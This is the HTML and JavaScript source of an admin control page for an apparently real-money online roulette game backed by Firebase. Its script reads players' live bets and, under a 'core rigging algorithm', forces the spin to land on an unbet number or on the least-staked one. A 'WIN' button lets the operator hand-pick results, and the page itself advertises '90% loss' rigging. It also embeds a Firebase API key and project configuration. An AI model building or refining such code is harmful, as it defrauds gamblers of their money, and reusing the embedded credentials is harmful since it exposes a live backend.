<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Master Admin | Roulette Controller</title>
    <style>
        body { background: #111; color: #fff; font-family: sans-serif; text-align: center; margin: 0; padding: 20px; }
        .grid { display: grid; grid-template-columns: repeat(6, 1fr); gap: 10px; padding: 20px; max-width: 900px; margin: auto; }
        @media (max-width: 600px) { .grid { grid-template-columns: repeat(3, 1fr); } }
        .card { background: #222; padding: 10px; border-radius: 5px; border-bottom: 3px solid #444; font-size: 14px; }
        .win { color: #22c55e; font-weight: bold; }
        .loss { color: #ef4444; font-weight: bold; }
        button { background: #fbbf24; border: none; padding: 6px 10px; cursor: pointer; font-weight: bold; margin-top: 5px; width: 100%; border-radius: 4px; transition: 0.1s; }
        button:active { transform: scale(0.95); }
        #timer { font-size: 50px; color: #fbbf24; font-weight: 900; margin: 10px 0; }
        #mode-status { color: #ef4444; font-weight: 900; letter-spacing: 1px; text-transform: uppercase; }
    </style>
</head>
<body>
    <h1>ROULETTE LOSS-CONTROL</h1>
    <div id="timer">60s</div>
    <p id="mode-status">MODE: AUTO-RIGGING (90% LOSS)</p>

    <div class="grid" id="admGrid"></div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getDatabase, ref, onValue, update, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

    const firebaseConfig = { apiKey: "AIzaSyAzfvbiqRqsQwBOOIkegxJD09di-S_tfHg", authDomain: "test-eb5e7.firebaseapp.com", databaseURL: "https://test-eb5e7-default-rtdb.firebaseio.com", projectId: "test-eb5e7", appId: "1:366282855653:web:dca7e000f5a22fb11f300c" };
    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    let state = "BETTING", forceRes = null, currentBets = {};
    let localCurrentPeriod = 0, adminProcessed = false;

    // Connect to global distributed master clock sync offset
    onValue(ref(db, ".info/serverTimeOffset"), offsetSnap => {
        const offset = offsetSnap.val() || 0;
        
        setInterval(() => {
            const serverTime = Date.now() + offset;
            const totalSeconds = Math.floor(serverTime / 1000);
            const secondInMinute = totalSeconds % 60;
            const periodId = Math.floor(totalSeconds / 60);

            const timerEl = document.getElementById("timer");
            const modeEl = document.getElementById("mode-status");

            if (localCurrentPeriod !== periodId) {
                localCurrentPeriod = periodId;
                adminProcessed = false;
                resetBets();
            }

            if (secondInMinute < 50) {
                // Shared Real-time Betting Window (User Side active)
                state = "BETTING";
                let clockCountdown = 50 - secondInMinute;
                timerEl.innerText = clockCountdown + "s";
                timerEl.style.color = "#fbbf24";
                modeEl.innerText = "PHASE: USER BETTING OPEN (PERIOD: " + periodId + ")";
                modeEl.style.color = "#38bdf8";
            } else {
                // Shared Lockout & Forced Spin Window (Last 10 Seconds)
                state = "RESULT";
                let spinCountdown = 60 - secondInMinute;
                timerEl.innerText = spinCountdown + "s";
                timerEl.style.color = "#ef4444";
                modeEl.innerText = "PHASE: SYSTEM CLOSED - RIGGING CALCULATION";
                modeEl.style.color = "#ef4444";

                if (!adminProcessed) {
                    adminProcessed = true;
                    processMatch(periodId);
                }
            }
        }, 1000);
    });

    async function processMatch(periodId) {
        // Compute best rigged number based on active matrix
        let finalRes = calculateRiggedResult();

        // Push calculation vectors directly into shared history nodes
        await set(ref(db, `roulette_history/${periodId}`), {
            period: periodId,
            result: finalRes,
            timestamp: Date.now()
        });

        // Notify client side nodes instantly to kickstart active dynamic rotations
        await update(ref(db, "roulette_live"), { 
            state: "RESULT", 
            result: finalRes,
            time: 10
        });

        // Clear manual override switches for next cycle rotation
        forceRes = null;
        document.getElementById("mode-status").innerText = "MODE: AUTO-RIGGING (90% LOSS)";
    }

    function calculateRiggedResult() {
        // If administrator injected manual selection via control board
        if(forceRes !== null) return forceRes;

        // --- CORE RIGGING ALGORITHM ---
        let possibleNumbers = [];
        for(let i=0; i<=36; i++) {
            // Check for segments containing clean absolute zero investments
            let amt = currentBets[i]?.amt || 0;
            if(amt === 0) {
                possibleNumbers.push(i);
            }
        }

        // If dead zones detected, force selection there (100% house profit edge)
        if(possibleNumbers.length > 0) {
            return possibleNumbers[Math.floor(Math.random() * possibleNumbers.length)];
        }

        // If users covered full layout, trace global minimal liability path
        let minAmt = Infinity;
        let bestNum = 0;
        for(let i=0; i<=36; i++) {
            let amt = currentBets[i]?.amt || 0;
            if(amt < minAmt) { 
                minAmt = amt; 
                bestNum = i; 
            }
        }
        return bestNum;
    }

    function resetBets() {
        currentBets = {};
        renderAdminGrid();
        update(ref(db, "roulette_live"), { 
            totalBets: {}, 
            state: "BETTING",
            time: 50
        });
    }

    // Dynamic grid template building pipeline
    function renderAdminGrid() {
        const g = document.getElementById("admGrid"); 
        g.innerHTML = "";
        for(let i=0; i<=36; i++){
            let a = currentBets[i]?.amt || 0;
            g.innerHTML += `
                <div class="card">
                    <b>Num ${i}</b><br>
                    <span class="${a > 0 ? 'loss' : 'win'}">₹${a.toFixed(2)}</span>
                    <button onclick="setW(${i})">WIN</button>
                </div>`;
        }
    }

    // Live update parser mapping real-time payload mutations from client transactions
    onValue(ref(db, "roulette_live/totalBets"), s => {
        currentBets = s.val() || {};
        renderAdminGrid();
    });

    // Global click handler to execute targeted manual victory operations
    window.setW = (n) => { 
        forceRes = n; 
        alert("FORCED OVERRIDE ACTIVE: Number " + n + " will win this round!"); 
        document.getElementById("mode-status").innerText = "MANUAL WIN INJECTED FOR: NUMBER " + n;
        document.getElementById("mode-status").style.color = "#fbbf24";
    };
</script>
</body>
</html>
